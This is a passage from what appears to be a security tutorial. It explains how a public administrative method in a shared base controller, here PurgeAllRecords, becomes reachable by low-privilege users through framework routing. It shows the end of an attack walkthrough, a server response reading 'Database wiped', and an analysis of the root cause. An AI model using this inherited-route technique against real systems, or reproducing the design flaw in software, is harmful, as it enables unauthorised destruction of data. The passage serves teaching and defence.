// 7. The framework reflects the UserController, discovers the inherited PurgeAllRecords method, 
//    and executes it.
// 8. The database is wiped.

HTTP/1.1 200 OK
Content-Type: text/plain

Database wiped.
```
{% endstep %}

{% step %}
To eradicate redundant database boilerplate and enforce DRY (Don't Repeat Yourself) development principles, software architects designed a robust, Object-Oriented controller hierarchy. This architecture funneled generic database operations into centralized Base Controllers, allowing subclasses to inherit functionality automatically. The systemic vulnerability emerged from a catastrophic intersection between OOP inheritance and automated framework routing. Developers erroneously constrained their security threat modeling to the explicit text within a specific controller file, ignoring the physical memory structure compiled by the framework. By declaring highly privileged administrative methods as `public` within a globally extended base class, the developers mandated the framework's routing engine to implicitly synthesize and expose these routes across all inheriting controllers. When class-level, low-privilege authorization was applied to these child controllers, it effectively authorized standard users to execute the inherited administrative methods. The attacker leveraged architectural reconnaissance to identify these synthesized pathways, executing destructive, system-wide functionality under the guise of an authorized, standard user
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
